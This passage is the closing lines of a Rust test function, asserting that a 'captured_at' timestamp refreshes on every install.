        assert_ne!(
            captured_at_1, captured_at_2,
            "captured_at must refresh on every install"
        );
    }
}
